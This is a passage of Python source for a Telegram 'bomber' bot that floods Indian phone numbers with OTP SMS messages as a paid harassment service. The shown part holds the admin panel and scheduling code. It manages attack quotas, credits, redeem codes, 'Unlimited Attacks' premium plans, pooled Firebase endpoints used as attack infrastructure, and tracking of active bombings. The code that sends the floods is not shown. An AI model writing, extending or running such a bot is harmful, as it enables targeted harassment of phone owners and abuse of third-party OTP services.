                rnd = get_config("random_max_sms", "500")
                cus = get_config("custom_max_sms", "100")
                fa = get_config("free_attacks", "2")
                rt = get_config("refill_hours", "12")
                txt = (
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "   ⚙️ ʜɪᴅᴅᴇɴ ʟɪᴍɪᴛꜱ\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Random OTP Limit: `{rnd}`\n"
                    f"📊 Custom Limit: `{cus}`\n"
                    f"📊 Daily Free Attacks: `{fa}`\n"
                    f"📊 Refill Time: `{rt}h`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                )
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✏️ EDIT", callback_data="adm:limits_edit",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            if a == "limits_edit":
                await q.edit_message_text(
                    "✏️ Which limit to edit?",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📊 Random OTP Limit", callback_data="adm:set:random_max_sms",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("📊 Custom Limit", callback_data="adm:set:custom_max_sms",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("📊 Daily Free Attacks", callback_data="adm:set:free_attacks",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("📊 Refill Time", callback_data="adm:set:refill_hours",
                                              api_kwargs={"style": "primary"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:limits_menu",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if a.startswith("set:"):
                key = a.split(":", 1)[1]
                context.user_data["admin_action"] = f"set_config:{key}"
                labels = {
                    "random_max_sms": "Random OTP Limit",
                    "custom_max_sms": "Custom Limit",
                    "free_attacks": "Daily Free Attacks",
                    "refill_hours": "Refill Time (hours)",
                }
                current = get_config(key, "0")
                await q.edit_message_text(
                    f"✏️ *{labels.get(key, key)}*\n\n"
                    f"Current: `{current}`\n\nSend new value:",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔙 CANCEL", callback_data="adm:limits_menu",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            # CHANNELS
            if a == "channels_menu":
                chs = get_force_channels()
                if not chs:
                    txt = "📭 _No channels_"
                else:
                    txt = f"Total: {len(chs)}\n\n"
                    for i, ch in enumerate(chs, 1):
                        txt += f"{i}. 📢 {ch['label']}\n   `{ch['id']}`\n"
                await q.edit_message_text(txt,
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("➕ ADD CHANNEL", callback_data="adm:add_channel",
                                              api_kwargs={"style": "success"})],
                        [InlineKeyboardButton("❌ REMOVE", callback_data="adm:remove_channel_menu",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]))
                return
            
            if a == "add_channel":
                context.user_data["admin_action"] = "add_channel"
                await q.edit_message_text("Send channel username (e.g. @channel):"); return
            
            if a == "remove_channel_menu":
                chs = get_force_channels()
                if not chs:
                    await q.edit_message_text("📭 No channels.",
                                              reply_markup=back_kb("adm:channels_menu")); return
                btns = []
                for i, ch in enumerate(chs):
                    btns.append([InlineKeyboardButton(f"🗑️ {ch['label'][:30]}",
                                                      callback_data=f"adm:rm_ch:{i}",
                                                      api_kwargs={"style": "danger"})])
                btns.append([InlineKeyboardButton("🔙 BACK",
                                                   callback_data="adm:channels_menu",
                                                   api_kwargs={"style": "primary"})])
                await q.edit_message_text("Select channel:",
                    reply_markup=InlineKeyboardMarkup(btns))
                return
            
            if a.startswith("rm_ch:"):
                try:
                    idx = int(a.split(":")[1])
                    chs = get_force_channels()
                    if idx < 0 or idx >= len(chs):
                        await q.answer("Invalid.", show_alert=True); return
                    ch = chs[idx]
                    kb = InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ YES, REMOVE",
                                              callback_data=f"adm:confirm_rm:{idx}",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("❌ CANCEL",
                                              callback_data="adm:remove_channel_menu",
                                              api_kwargs={"style": "primary"})],
                    ])
                    await q.edit_message_text(
                        f"⚠️ *Confirm remove*\n\n"
                        f"📢 {ch['label']}\n🆔 `{ch['id']}`\n\n"
                        f"Are you sure?",
                        reply_markup=kb, parse_mode="Markdown")
                except Exception: pass
                return
            
            if a.startswith("confirm_rm:"):
                try:
                    idx = int(a.split(":")[1])
                    chs = get_force_channels()
                    if idx < 0 or idx >= len(chs): return
                    ch = chs[idx]
                    conn = db(); c = conn.cursor()
                    c.execute("DELETE FROM force_channels WHERE id = ?", (ch["id"],))
                    conn.commit(); conn.close()
                    with _join_lock: _join_cache.clear()
                    await q.edit_message_text(
                        f"✅ *Removed*\n\n📢 {ch['label']}",
                        parse_mode="Markdown",
                        reply_markup=back_kb("adm:channels_menu"))
                except Exception: pass
                return
            
            # MAINTENANCE
            if a == "maintenance":
                cur = get_config("maintenance", "0")
                new = "0" if cur == "1" else "1"
                set_config("maintenance", new)
                state = "🟢 BOT ON" if new == "0" else "🔴 BOT OFF"
                await q.edit_message_text(
                    f"🔧 *Maintenance*\n\nStatus: {state}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 TOGGLE", callback_data="adm:maintenance",
                                              api_kwargs={"style": "danger"})],
                        [InlineKeyboardButton("🔙 BACK", callback_data="adm:main",
                                              api_kwargs={"style": "primary"})],
                    ]), parse_mode="Markdown")
                return
            
            # BROADCAST
            if a == "bc_all":
                context.user_data["admin_action"] = "bc_all"
                await q.edit_message_text("Send broadcast message:"); return
        except Exception as e:
            log.error(f"admin_callback: {e}")
# ===================== ADMIN TEXT INPUT HANDLER =====================
async def handle_admin_input(update, context):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    action = context.user_data.get("admin_action")
    
    if not action or not has_admin_access(uid):
        return False
    
    try:
        # ---------- BAN USER ----------
        if action == "ban_add":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)", (target_id,))
            conn.commit(); conn.close()
            try:
                await context.bot.send_message(target_id,
                    f"🚫 *You have been banned* from using this bot.\n\n"
                    f"📌 Contact: {SUPPORT_USERNAME}",
                    parse_mode="Markdown")
            except Exception: pass
            log_activity(uid, "Ban", str(target_id))
            await update.message.reply_text(f"✅ Banned: `{target_id}`", parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- UNBAN USER ----------
        if action == "ban_remove":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            conn = db(); c = conn.cursor()
            c.execute("DELETE FROM banned_users WHERE user_id = ?", (target_id,))
            conn.commit(); conn.close()
            try:
                await context.bot.send_message(target_id,
                    "✅ *You have been unbanned!*",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(f"✅ Unbanned: `{target_id}`", parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- PREMIUM REMOVE ----------
        if action == "prem_del":
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            update_user(target_id, is_premium=0, premium_type=None, premium_expires_at=0)
            try:
                await context.bot.send_message(target_id, "❌ *Premium removed.*", parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(f"✅ Premium removed: `{target_id}`", parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- GIVE CREDITS ----------
        if action == "give_credits":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `<user_id> <credits>`", parse_mode="Markdown")
                return True
            try:
                target_id = int(parts[0]); amount = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid input.")
                return True
            if amount <= 0:
                await update.message.reply_text("❌ Credits must be positive.")
                return True
            u = get_user(target_id)
            if not u:
                await update.message.reply_text("❌ User not found.")
                return True
            new_cred = u.get("credits", 0) + amount
            update_user(target_id, credits=new_cred)
            try:
                await context.bot.send_message(target_id,
                    f"🎁 *CREDITS ADDED*\n\n✅ +{amount} Credits\n💰 New Balance: `{new_cred}`",
                    parse_mode="Markdown")
            except Exception: pass
            await update.message.reply_text(
                f"✅ +{amount} credits to `{target_id}`\n💰 New: `{new_cred}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- REMOVE CREDITS ----------
        if action == "remove_credits":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `<user_id> <credits>`", parse_mode="Markdown")
                return True
            try:
                target_id = int(parts[0]); amount = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid input.")
                return True
            u = get_user(target_id)
            if not u:
                await update.message.reply_text("❌ User not found.")
                return True
            new_cred = max(0, u.get("credits", 0) - amount)
            update_user(target_id, credits=new_cred)
            await update.message.reply_text(
                f"✅ -{amount} credits from `{target_id}`\n💰 New: `{new_cred}`",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- BULK CREDITS INPUT ----------
        if action == "bulk_credits_input":
            try:
                amount = int(text)
            except ValueError:
                await update.message.reply_text("❌ Send a number.")
                return True
            if amount <= 0:
                await update.message.reply_text("❌ Must be positive.")
                return True
            if amount > 10000:
                await update.message.reply_text("❌ Max 10000 per user.")
                return True
            
            conn = db(); c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            conn.close()
            
            context.user_data["bulk_amount"] = amount
            context.user_data["admin_action"] = None
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ⚠️ ᴄᴏɴꜰɪʀᴍ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"💰 Per User: `{amount}`\n"
                f"👥 Users: `{total_users}`\n"
                f"📊 Total: `{amount * total_users}` credits\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"⚠️ Cannot be undone.\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ YES, CONFIRM", callback_data="adm:bulk_confirm",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("❌ CANCEL", callback_data="adm:main",
                                          api_kwargs={"style": "danger"})],
                ]))
            return True
        
        # ---------- GENERATE REDEEM ----------
        if action == "generate_redeem":
            parts = text.split()
            if len(parts) != 2:
                await update.message.reply_text("❌ Format: `<credits> <max_uses>`", parse_mode="Markdown")
                return True
            try:
                credits = int(parts[0]); max_uses = int(parts[1])
            except ValueError:
                await update.message.reply_text("❌ Invalid numbers.")
                return True
            if credits <= 0 or max_uses <= 0:
                await update.message.reply_text("❌ Positive numbers only.")
                return True
            if max_uses > 1000:
                await update.message.reply_text("❌ Max 1000 uses.")
                return True
            
            for _ in range(10):
                code = ("WARRIOR-" 
                        + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
                        + "-"
                        + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)))
                conn = db(); c = conn.cursor()
                c.execute("SELECT 1 FROM redeem_codes WHERE code = ?", (code,))
                if not c.fetchone():
                    c.execute("INSERT INTO redeem_codes (code, credits, max_uses, created_by) VALUES (?, ?, ?, ?)",
                              (code, credits, max_uses, uid))
                    conn.commit(); conn.close()
                    break
                conn.close()
            else:
                await update.message.reply_text("❌ Try again.")
                return True
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ᴄᴏᴅᴇ ɢᴇɴᴇʀᴀᴛᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🎁 Code: `{code}`\n"
                f"💰 Credits: `{credits}`\n"
                f"👥 Max Uses: `{max_uses}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 GENERATE ANOTHER", callback_data="adm:gen_redeem",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("📋 ACTIVE CODES", callback_data="adm:active_codes",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- GIVE UNLIMITED ----------
        if action.startswith("give_unlimited:"):
            days = int(action.split(":")[1])
            if not text.isdigit():
                await update.message.reply_text("❌ Numeric ID only.")
                return True
            target_id = int(text)
            if not get_user(target_id):
                await update.message.reply_text("❌ User not found. Ask them to /start first.")
                return True
            
            if days == 0:
                expires_at = 0
                label = "Lifetime"
                user_msg = ("♾️ *UNLIMITED PLAN ACTIVATED*\n\n"
                            "👑 Lifetime Access\n⚡ Unlimited Attacks")
            else:
                expires_at = time.time() + (days * 86400)
                label = f"{days} Days"
                user_msg = (f"♾️ *UNLIMITED PLAN ACTIVATED*\n\n"
                            f"⚡ Duration: {days} Days\n⚡ Unlimited Attacks")
            
            update_user(target_id, is_premium=1,
                        premium_type=f"unlimited_{days}d",
                        premium_expires_at=expires_at)
            try:
                await context.bot.send_message(target_id, user_msg, parse_mode="Markdown")
            except Exception: pass
            
            log_activity(uid, "Give Unlimited", f"{target_id} — {label}")
            
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"   ✅ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"👤 User: `{target_id}`\n"
                f"📅 Duration: `{label}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 PREMIUM MENU", callback_data="adm:prem_menu",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- ADD FIREBASE (BULK / SINGLE) ----------
        if action == "add_firebase":
            raw = text.strip()
            urls = []
            for line in raw.replace(",", "\n").replace(" ", "\n").split("\n"):
                line = line.strip().rstrip("/")
                if line.startswith("http") and ("firebaseio.com" in line or "firebasedatabase.app" in line):
                    urls.append(line)
            urls = list(dict.fromkeys(urls))
            
            if not urls:
                await update.message.reply_text(
                    "❌ No valid Firebase URLs.\n\n"
                    "Example:\n`https://xxx-default-rtdb.firebaseio.com`",
                    parse_mode="Markdown")
                return True
            
            total = len(urls)
            is_bulk = total > 1
            
            log.info(f"[ADD FB] {total} URLs from {uid} | Bulk: {is_bulk}")
            
            mode_text = "Bulk" if is_bulk else "Single"
            progress_msg = await update.message.reply_text(
                f"⏳ *Checking {total} URL(s)* [{mode_text}]...\n\n"
                f"░░░░░░░░░░░░░░░░░░░░ 0%",
                parse_mode="Markdown")
            
            check_results = await asyncio.to_thread(check_firebases_bulk, urls)
            
            added = []; dead = []; duplicate = []; skipped_low = []
            
            conn = db(); c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM firebases")
            current_count = c.fetchone()[0]
            conn.close()
            
            for result in check_results:
                url = result["url"]
                stats = result["stats"]
                
                # Dead — never add
                if stats is None:
                    dead.append(url)
                    continue
                
                # Bulk mode — min 10 online
                if is_bulk and stats["online"] < 10:
                    skipped_low.append({"url": url, "online": stats["online"]})
                    continue
                
                # Add
                tag = f"FB{current_count + len(added) + 1}"
                conn = db(); c = conn.cursor()
                try:
                    c.execute("INSERT INTO firebases (url, tag) VALUES (?, ?)", (url, tag))
                    conn.commit()
                    added.append({"tag": tag, "url": url,
                                  "online": stats["online"], "offline": stats["offline"]})
                    firebase_cache[tag] = stats
                except Exception:
                    duplicate.append(url)
                finally:
                    conn.close()
            
            summary = ("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                       "   ✅ ᴀᴅᴅ ᴄᴏᴍᴘʟᴇᴛᴇ\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                       f"📊 ꜱᴜᴍᴍᴀʀʏ:\n\n"
                       f"✅ Added: `{len(added)}`\n"
                       f"❌ Dead: `{len(dead)}`\n")
            if is_bulk:
                summary += f"⚠️ Low (<10): `{len(skipped_low)}`\n"
            summary += (f"⚠️ Duplicate: `{len(duplicate)}`\n"
                        f"📊 Total: `{total}`\n\n")
            summary += ("📌 _Bulk: ≥10 online required_\n\n" if is_bulk
                        else "📌 _Single: alive only (0+)_\n\n")
            
            if added:
                summary += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                summary += f"📋 ᴀᴅᴅᴇᴅ ({len(added)}):\n\n"
                for fb in added[:15]:
                    summary += f"🟢 `{fb['tag']}` — {fb['online']}🟢 {fb['offline']}🔴\n"
                if len(added) > 15:
                    summary += f"_+{len(added) - 15} more_\n"
                summary += "\n"
            
            if is_bulk and skipped_low:
                summary += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                summary += f"⚠️ ꜱᴋɪᴘᴘᴇᴅ (<10):\n\n"
                for s in skipped_low[:10]:
                    summary += f"• {s['online']}🟢 `{s['url']}`\n"
                if len(skipped_low) > 10:
                    summary += f"_+{len(skipped_low) - 10} more_\n"
                summary += "\n"
            
            if dead:
                summary += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                summary += f"❌ ᴅᴇᴀᴅ ({len(dead)}):\n\n"
                for url in dead[:10]:
                    summary += f"• `{url}`\n"
                if len(dead) > 10:
                    summary += f"_+{len(dead) - 10} more_\n"
                summary += "\n"
            
            summary += "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            
            log_activity(uid, "Add Firebase", f"Added {len(added)}, Dead {len(dead)}")
            
            await progress_msg.edit_text(summary, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛰️ VIEW FIREBASES", callback_data="adm:fb_menu",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("➕ ADD MORE", callback_data="adm:fb_add",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- ADD CHANNEL ----------
        if action == "add_channel":
            ch = text.strip()
            if ch.startswith("https://t.me/"):
                ch = "@" + ch.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
            if not ch.startswith("@"):
                ch = "@" + ch
            if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", ch):
                await update.message.reply_text("❌ Invalid. Example: `@mychannel`",
                                                parse_mode="Markdown")
                return True
            try:
                chat = await context.bot.get_chat(ch)
                label = chat.title or ch
            except Exception:
                await update.message.reply_text(
                    f"❌ Cannot access. Make bot admin in `{ch}`.",
                    parse_mode="Markdown")
                return True
            chs = get_force_channels()
            if any(c["id"].lower() == ch.lower() for c in chs):
                await update.message.reply_text("⚠️ Already added.")
                context.user_data.pop("admin_action", None)
                return True
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO force_channels (id, label, url) VALUES (?, ?, ?)",
                      (ch, label, f"https://t.me/{ch.lstrip('@')}"))
            conn.commit(); conn.close()
            with _join_lock: _join_cache.clear()
            await update.message.reply_text(f"✅ Channel added: *{label}*",
                                            parse_mode="Markdown")
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- SET CONFIG ----------
        if action.startswith("set_config:"):
            key = action.split(":", 1)[1]
            try:
                value = int(text)
            except ValueError:
                await update.message.reply_text("❌ Send a number.")
                return True
            if value <= 0:
                await update.message.reply_text("❌ Must be positive.")
                return True
            labels = {
                "random_max_sms": "Random OTP Limit",
                "custom_max_sms": "Custom Limit",
                "free_attacks": "Daily Free Attacks",
                "refill_hours": "Refill Time",
            }
            set_config(key, value)
            await update.message.reply_text(
                f"✅ *Updated*\n\n"
                f"⚙️ {labels.get(key, key)}\n"
                f"📊 New: `{value}`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⚙️ LIMITS", callback_data="adm:limits_menu",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- PROTECTED ADD ----------
        if action == "prot_add":
            num = text.strip()
            if not (num.isdigit() and len(num) == 10):
                await update.message.reply_text("❌ 10-digit number without +91.")
                return True
            if num[0] not in "6789":
                await update.message.reply_text("❌ Indian numbers start with 6-9.")
                return True
            conn = db(); c = conn.cursor()
            c.execute("SELECT number FROM protected_numbers WHERE number = ?", (num,))
            if c.fetchone():
                conn.close()
                await update.message.reply_text(f"⚠️ `{num}` already protected.", parse_mode="Markdown")
                context.user_data.pop("admin_action", None)
                return True
            c.execute("INSERT INTO protected_numbers (number, added_by) VALUES (?, ?)", (num, uid))
            conn.commit(); conn.close()
            log_activity(uid, "Protect Add", num)
            await update.message.reply_text(
                f"✅ Protected: `{num}`\n\nNow no one can bomb this number.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("➕ ADD ANOTHER", callback_data="adm:prot_add",
                                          api_kwargs={"style": "success"})],
                    [InlineKeyboardButton("🛡️ VIEW ALL", callback_data="adm:prot_menu",
                                          api_kwargs={"style": "primary"})],
                ]))
            context.user_data.pop("admin_action", None)
            return True
        
        # ---------- BROADCAST ----------
        if action == "bc_all":
            conn = db(); c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            rows = c.fetchall(); conn.close()
            msg = await update.message.reply_text(f"📢 Broadcasting to {len(rows)} users...")
            sent = 0; failed = 0
            for (target_id,) in rows:
                try:
                    await context.bot.send_message(target_id,
                        f"📢 *ANNOUNCEMENT*\n\n{text}",
                        parse_mode="Markdown")
                    sent += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(0.05)
            try:
                await msg.edit_text(
                    f"✅ *Broadcast done*\n\n📨 Sent: `{sent}`\n❌ Failed: `{failed}`",
                    parse_mode="Markdown")
            except Exception:
                await update.message.reply_text(f"✅ Sent: {sent}, Failed: {failed}")
            context.user_data.pop("admin_action", None)
            return True
    except Exception as e:
        log.error(f"admin_input error: {e}")
        await update.message.reply_text(f"❌ Error: {e}")
        context.user_data.pop("admin_action", None)
        return True
    return False

# ===================== ERROR HANDLER =====================
async def error_handler(update, context):
    try:
        err = context.error
        log.error(f"[ERROR] {err}", exc_info=err)
    except Exception: pass

# ===================== CLEANUP TASK =====================
async def cleanup_task():
    while True:
        try:
            await asyncio.sleep(300)
            now = time.time()
            for uid_ in list(active_bombings_detail.keys()):
                info = active_bombings_detail.get(uid_, {})
                if not bombing_active.get(uid_) and now - info.get("started", now) > 600:
                    active_bombings_detail.pop(uid_, None)
                    request_counts.pop(uid_, None)
                    bombing_threads.pop(str(uid_), None)
            with _join_lock:
                stale = [u_ for u_, t_ in _join_cache.items() if now - t_ > 600]
                for u_ in stale: _join_cache.pop(u_, None)
            log.info(f"[CLEANUP] Active: {sum(1 for v in bombing_active.values() if v)}")
        except Exception as e:
            log.error(f"cleanup: {e}")

# ===================== FIREBASE REFRESH =====================
async def firebase_refresh_task():
    while True:
        try:
            await asyncio.sleep(AUTO_REFRESH_SEC)
            fbs = get_firebases()
            if not fbs: continue
            for fb in fbs:
                stats = fetch_firebase_stats(fb["url"])
                if stats: firebase_cache[fb["tag"]] = stats
            log.info(f"[FIREBASE] Refreshed {len(fbs)}")
        except Exception as e:
            log.error(f"fb refresh: {e}")

# ===================== POST INIT =====================
async def post_init(application):
    try:
        asyncio.create_task(cleanup_task())
        asyncio.create_task(firebase_refresh_task())
        log.info("[INIT] Background tasks started")
        me = await application.bot.get_me()
        log.info(f"[BOT] @{me.username} started")
    except Exception as e:
        log.error(f"post_init: {e}")

# ===================== MAIN =====================
def main():
    print("=" * 60)
    print("   WARRIOR BOMBER BOT — FINAL FIXED v4")
    print("=" * 60)
    print(f"🤖 Token: {BOT_TOKEN[:20]}...")
    print(f"👑 Owner: {OWNER_ID}")
    print(f"👮 Admins: {ADMIN_IDS}")
    print(f"🔌 APIs: {len(APIS)}")
    print(f"⚡ Threads: {THREAD_COUNT}")
    print(f"🔍 Scan Workers: {SCAN_WORKERS}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"💬 Support: {SUPPORT_USERNAME}")
    print("=" * 60)
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CallbackQueryHandler(join_callback, pattern=r"^join_"))
    app.add_handler(CallbackQueryHandler(user_callback,
        pattern=r"^(bomb:|bomb_type:|user:|rc:)"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^adm:"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    app.post_init = post_init
    
    print("\n🚀 Starting...")
    print("=" * 60)
    
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES
    )

if __name__ == "__main__":
    main()